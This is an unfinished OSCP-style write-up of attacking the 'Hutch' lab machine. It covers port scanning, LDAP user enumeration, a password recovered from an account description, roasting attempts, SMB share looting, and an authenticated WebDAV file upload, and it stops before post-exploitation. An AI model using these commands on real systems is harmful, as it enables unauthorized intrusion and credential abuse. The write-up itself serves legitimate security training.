# PGP Nickel - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-2

---

## 0. Lesson Learned



---

## 1. Executive Summary



---

## 2. Scope

- **Target:** 192.168.199.122
- **Environment:** Proving Grounds Practice Hutch
- **Testing Window:** 2026-2-27
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Scan:

```
nmap -p- -sCV 192.168.199.122 -T4 -oA hutch_tcp
```

Identified open ports:

- 53 DNS
- 80 HTTP (IIS 10.0 WebDAV)
- 88 Kerberos
- 135/139/445 SMB
- 389 LDAP
- 464 Kpasswd
- 593 RPC
- 636 LDAPS
- 3268/3269 Global Catalog
- 5985 WinRM
- 9389 .NET Message Framing
- 49666-49692 RPC

---

## 5. Enumeration

Anonymous SMB login successful with limited access:

```
smbclient -L //192.168.199.122 -N
```

Users were enumerated with LDAP after retrieving naming contexts:

```
ldapsearch -x -H ldap://192.168.199.122 -s base namingcontexts

ldapsearch -x -H ldap://192.168.199.122 -b "DC=hutch,DC=offsec" "(objectClass=person)"
```

User Freddy McSorely (`fmcsorley`) had a plainext password stored in the description field:

```
Password set to CrabSharkJellyfish192 at user's request.
```

Resulting in recovered credentials:

```
fmcsorley : CrabSharkJellyfish192
```

Successful authentication confirmed with crackmapexec:

```
crackmapexec smb 192.168.199.122 -u fmcsorley -p CrabSharkJellyfish192
```

Continuing enumeration LDAP simple bind was successful:

```
ldapdomaindump ldap://192.168.199.122 -u 'HUTCH/fmcsorley' -p 'CrabSharkJellyfish192' --authtype SIMPLE
```

No SPNs found for Kerberoastable accounts:

```
GetUserSPNs.py HUTCH.OFFSEC/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.199.122 -request
```

No vulnerable AS-REP roastable accounts:

```
GetNPUsers.py HUTCH.OFFSEC/ -no-pass -dc-ip 192.168.199.122 -usersfile userslist.txt
```

Authenticated SMB shares were accessed by no credential material discoved:

```
smbclient //192.168.199.122 -U fmcsorley%CrabSharkJellyfish192
cd SYSVOL
RECURSE ON
PROMPT OFF
mget *
```

---

## 6. Initial Access

Initial Nmap scan revealed risky HTTP PUT method enabled. Attempted upload without credentials was unauthorized:

```
curl -i -T test.txt http://192.168.199.122/test.txt
```

Upload was successful using recovered credentials:

```
curl -i -u 'fmcsorley:CrabSharkJellyfish192' -T test.txt http://192.168.199.122/test.txt
```

Resulting in a 201 Created response code.

---

## 7. Post-Exploitation

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix